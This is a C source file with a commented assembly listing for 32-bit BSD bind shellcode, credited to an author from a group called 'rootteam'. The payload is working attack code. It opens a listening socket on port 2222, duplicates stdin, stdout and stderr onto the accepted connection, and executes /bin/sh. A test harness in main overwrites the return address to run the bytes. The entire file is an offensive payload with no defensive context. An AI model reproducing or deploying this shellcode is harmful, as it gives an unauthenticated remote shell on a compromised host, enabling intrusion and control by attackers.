/* The bind shellcode that opens the shell on 2222nd port
   Size    100 bytes
   OS	   *BSD
  		/rootteam/dev0id	(rootteam.void.ru)
			dev0id@uncompiled.com


BITS	32

main:
	xor	eax,eax
	push byte	0x06
	push byte	0x01
	push byte	0x02
	mov	al,0x61
	push	eax
	int	0x80
	mov	edx,eax
	xor	eax,eax
	push	eax
	push long 0xAE0802ff
	mov	eax,esp
	push byte	0x10
	push	eax
	push	edx
	xor	eax,eax
	mov	al,0x68
	push	eax
	int	0x80
	push byte	0x1
	push	edx
	xor	eax,eax
	mov	al,0x6a
	push	eax
	int	0x80
	xor	eax,eax
	push	eax
	push 	eax
	push	edx
	mov	al,0x1e
	push	eax
	int	0x80
	mov	cl,3
	mov	ebx,-1
	mov	edx,eax
main_loop:
	inc	ebx
	push	ebx
	push	edx
	mov	al,0x5a
	push	eax
	int	0x80
	dec	cl
	jnz	main_loop
	xor	eax,eax
	push	eax
	push long	0x68732f6e
	push long 	0x69622f2f
	mov	ebx,esp
	push	eax
	push	esp
	push	ebx
	mov	al,0x3b
	push	eax
	int	0x80

*/

char shellcode[] =
	"\x31\xc0\x6a\x06\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2"
	"\x31\xc0\x50\x68\xff\x02\x08\xae\x89\xe0\x6a\x10\x50\x52\x31"
	"\xc0\xb0\x68\x50\xcd\x80\x6a\x01\x52\x31\xc0\xb0\x6a\x50\xcd"
	"\x80\x31\xc0\x50\x50\x52\xb0\x1e\x50\xcd\x80\xb1\x03\xbb\xff"
	"\xff\xff\xff\x89\xc2\x43\x53\x52\xb0\x5a\x50\xcd\x80\xfe\xc9"
	"\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
	"\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80";
int
main(void)
{
	int *ret;
	ret = (int*)&ret + 2;
	(*ret) = shellcode;
}